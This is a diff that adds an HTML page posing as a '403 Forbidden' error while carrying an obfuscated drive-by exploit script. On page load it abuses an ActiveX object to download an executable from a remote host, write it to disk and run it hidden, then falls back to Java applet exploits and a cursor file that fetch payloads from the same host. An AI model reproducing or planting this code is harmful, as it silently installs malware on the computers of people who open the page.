@@ -1,0 +1,72 @@
+<html>
+<head>
+<title>403 Forbidden</title>
+<style>
+* {CURSOR: url("anr/us0129.anr")}
+</style>
+</head>
+<body>
+<script>
+document.write(unescape("%3c%61%70%70%6c%65%74%20%63%6f%64%65%3d%61%6e%69%6d%61%6e%2e%63%6c%61%73%73%20%6e%61%6d%65%3d%6d%61%6e%69%6d%61%6e%20%68%65%69%67%68%74%3d%31%20%77%69%64%74%68%3d%31%20%4d%41%59%53%43%52%49%50%54%3e%3c%2f%61%70%70%6c%65%74%3e"));
+
+function pass1(ii, uu)
+{
+    var t = 'BD96C556'+'-'+'65A3-11'+'D0-98'+'3A-00C0'+'4FC29E36';
+    var b = null;
+    var a = document.createElement("object");
+    a.setAttribute("classid", "clsid:" + t);
+    if (a) {
+	try {
+	    eval('b = a.CreateObject("S"+ "h"+ "e"+"l"+ "l."+"A"+ "p"+"p"+ "li"+ "ca"+ ""+ "ti"+ "on", "")');
+	} catch(e){return -1;}
+	if (b) {
+	    var bin = "\\"+ii+"0129.e"+ "x"+"e";
+	    var xml = new ActiveXObject("Mi"+ "cr"+"os"+ "o"+"ft"+ ".XM"+ "LH"+ "TT"+ "P");
+	    xml.open("G"+ "ET", uu, false);
+	    xml.send(null);
+	    var dat = xml.responseBody;
+	    var o = a.CreateObject("ADODB.Stream", "");
+	    o.Type = 1;
+	    o.Mode = 3;
+	    o.Open();
+	    o.Write(dat);
+	    o.SaveToFile(bin, 2);
+	    b.ShellExecute(bin, null, null, null, 0);
+	    b.ShellExecute("c"+ "md", " /c del \\"+ii+"0129.exe", null, null, 0);
+	    return 1;
+	}
+    }
+    return -1;
+}
+function pass2()
+{
+    try {
+	var unsafeclass = document.maniman.getClass().forName("sun.misc.Unsafe");
+	var unsafemeth = unsafeclass.getMethod("getUnsafe", null);
+	var unsafe = unsafemeth.invoke(unsafemeth, null);
+	document.maniman.foobar(unsafe);
+	var chenref = unsafe.defineClass("omfg", document.maniman.luokka, 0, document.maniman.classSize);
+	var chen = unsafe.allocateInstance(chenref);
+	chen.setURLdl(unescape("%68%74%74%70%3a%2f%2f%6e%65%67%61%73%2e%69%6e%66%6f%2f"));
+	chen.setUname("0129");
+	chen.setCID("other");
+	chen.perse(unsafe);
+    } catch (d) {return -1;}
+    return 1;
+}
+function pass3()
+{
+    document.write(unescape("%3c%61%70%70%6c%65%74%20%61%72%63%68%69%76%65%3d%4f%50%2e%6a%61%72%20%63%6f%64%65%3d%4f%50%2e%63%6c%61%73%73%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%4d%41%59%53%43%52%49%50%54%3e%3c%70%61%72%61%6d%20%6e%61%6d%65%3d%75%73%69%64%20%76%61%6c%75%65%3d%75%73%30%31%32%39%3e%3c%70%61%72%61%6d%20%6e%61%6d%65%3d%6c%69%6e%6b%75%72%6c%20%76%61%6c%75%65%3d%68%74%74%70%3a%2f%2f%6e%65%67%61%73%2e%69%6e%66%6f%2f%3f%75%3d%30%31%32%39%26%74%3d%6f%74%68%65%72%26%6f%3d%34%26%73%3d%63%32%39%6d%64%43%35%4f%4d%6a%4d%75%63%33%4e%6f%4c%7a%41%78%4d%6a%6b%75%5a%58%68%6c%3e%3c%2f%61%70%70%6c%65%74%3e"));
+    document.write(unescape("%3c%41%50%50%4c%45%54%20%41%52%43%48%49%56%45%3d%64%73%62%72%2e%6a%61%72%20%63%6f%64%65%3d%4d%61%67%69%63%41%70%70%6c%65%74%2e%63%6c%61%73%73%20%57%49%44%54%48%3d%31%20%48%45%49%47%48%54%3d%31%20%6e%61%6d%65%3d%64%73%62%72%20%4d%41%59%53%43%52%49%50%54%3e%3c%70%61%72%61%6d%20%6e%61%6d%65%3d%4d%6f%64%75%6c%65%50%61%74%68%20%76%61%6c%75%65%3d%68%74%74%70%3a%2f%2f%6e%65%67%61%73%2e%69%6e%66%6f%2f%3f%75%3d%30%31%32%39%26%74%3d%6f%74%68%65%72%26%6f%3d%32%26%73%3d%63%32%39%6d%64%43%35%4f%4d%6a%4d%75%63%33%4e%6f%4c%7a%41%78%4d%6a%6b%75%5a%58%68%6c%3e%3c%2f%41%50%50%4c%45%54%3e"));
+    return 1;
+}
+if (pass1('wn', unescape("%68%74%74%70%3a%2f%2f%6e%65%67%61%73%2e%69%6e%66%6f%2f%3f%75%3d%30%31%32%39%26%74%3d%6f%74%68%65%72%26%6f%3d%30%26%73%3d%63%32%39%6d%64%43%35%4f%4d%6a%4d%75%63%33%4e%6f%4c%7a%41%78%4d%6a%6b%75%5a%58%68%6c")) != 1) {
+    if (pass2() != 1) {
+	pass3();
+    }
+}
+
+</script>
+<h1>Forbidden</h1><p>You don't have permissions.</p><hr>
+</body>
+</html>
